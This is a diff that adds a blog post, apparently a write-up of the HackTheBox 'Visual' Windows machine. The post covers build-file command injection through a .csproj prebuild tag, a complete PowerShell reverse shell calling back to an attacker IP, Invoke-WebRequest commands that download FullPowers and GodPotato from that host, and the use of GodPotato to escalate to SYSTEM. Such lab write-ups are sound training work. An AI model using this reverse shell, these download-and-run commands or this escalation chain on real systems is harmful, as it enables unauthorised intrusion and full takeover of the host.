@@ -1,0 +1,161 @@
+---
+layout: post
+title: "Visual 0840890c71974a4cb941dd43720bdafa"
+date:   2025-07-10 12:05:57 -0400
+categories: writeups
+---
+
+# Visual
+
+HackTheBox: Medium
+
+<aside>
+💡 Visual is a windows machine which handles with repositories and build visual studio projects
+
+</aside>
+
+## 1: Enumeration
+
+- nmap scanning
+
+![Untitled]({{ '/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled.png' | relative_url }})
+
+We find there’s a http service hosted in apache with php
+
+![Untitled]({{ '/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_1.png' | relative_url }})
+
+This service allows to make the build project in a automated way, we can see a section where we just put the url repo and wait for it.
+
+First at all we test functionality
+
+To get into the machine successfully we need some files:
+
+1. A repository with c# code
+2. A file .csproj and .sln
+3. A rev shell to access to the machine once the code is injected
+
+> The machine doesn’t have access to internet therefore we need to run a private server where we could get the repo, we get this in this way
+> 
+
+```bash
+git --bare clone external_repo
+cd repo/.git
+git --bare update-server-info
+mv hooks/post-updte.sample hooks/post-update
+cd ..
+python -m http.server 8000
+```
+
+> .csproj = This file has the possibility of iinject commands through prebuild tag.
+> 
+
+![Untitled]({{ '/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_2.png' | relative_url }})
+
+ 
+
+## 2: User flag
+
+```bash
+$socket = new-object System.Net.Sockets.TcpClient('10.10.14.14', 2222);
+if($socket -eq $null){exit 1}
+$stream = $socket.GetStream();
+$writer = new-object System.IO.StreamWriter($stream);
+$buffer = new-object System.Byte[] 1024;
+$encoding = new-object System.Text.AsciiEncoding;
+do
+{
+	$writer.Flush();
+	$read = $null;
+	$res = ""
+	while($stream.DataAvailable -or $read -eq $null) {
+		$read = $stream.Read($buffer, 0, 1024)
+	}
+	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
+	if(!$out.equals("exit")){
+		$args = "";
+		if($out.IndexOf(' ') -gt -1){
+			$args = $out.substring($out.IndexOf(' ')+1);
+			$out = $out.substring(0,$out.IndexOf(' '));
+			if($args.split(' ').length -gt 1){
+                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
+                $pinfo.FileName = "cmd.exe"
+                $pinfo.RedirectStandardError = $true
+                $pinfo.RedirectStandardOutput = $true
+                $pinfo.UseShellExecute = $false
+                $pinfo.Arguments = "/c $out $args"
+                $p = New-Object System.Diagnostics.Process
+                $p.StartInfo = $pinfo
+                $p.Start() | Out-Null
+                $p.WaitForExit()
+                $stdout = $p.StandardOutput.ReadToEnd()
+                $stderr = $p.StandardError.ReadToEnd()
+                if ($p.ExitCode -ne 0) {
+                    $res = $stderr
+                } else {
+                    $res = $stdout
+                }
+			}
+			else{
+				$res = (&"$out" "$args") | out-string;
+			}
+		}
+		else{
+			$res = (&"$out") | out-string;
+		}
+		if($res -ne $null){
+        $writer.WriteLine($res)
+    }
+	}
+}While (!$out.equals("exit"))
+$writer.close();
+$socket.close();
+$stream.Dispose()
+```
+
+Con este rev shell ponemos en escucha en el puerto establecido y ya obtenemos acceso 
+
+```powershell
+cmd /c type c:\Users\enox\Desktop\user.txt
+```
+
+## 3: Priv esc
+
+wrapper pred:
+
+```powershell
+cd C:\xampp\htdocs\uploads
+```
+
+Revisamos privilegios
+
+```powershell
+whoami /priv
+```
+
+Check some privileges and look “ImpersonatePrivilege” is not present
+
+![Untitled]({{ '/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_3.png' | relative_url }})
+
+We cannot modify or access to files but we can create them
+
+Use the server early running and add fullpowers, a POC that rest default privileges
+
+With impersonate privileges we can assume other identities, sometime interesting that happens to me in this machine is that i had to reset the machine to make work fullpowers properly
+
+```powershell
+cmd /c powershell Invoke-WebRequest -Uri http://10.10.00.000:0000/fullpowers.exe -OutFile Fullpowers.exe
+fullpowers.exe
+```
+
+![Untitled]({{ '/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_4.png' | relative_url }})
+
+We got all priv is time to use godpotato and get the whole power
+
+```powershell
+powershell Invoke-WebRequest -Uri http://10.10.14.14:8000/GodPotato.exe -OutFile GodPotato.exe
+GodPotato-NET64 -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
+```
+
+There was a problem, godpotato which will allow us to run commands as system had 3 exe’s and only the 64 one worked
+
+Machine pwned!!
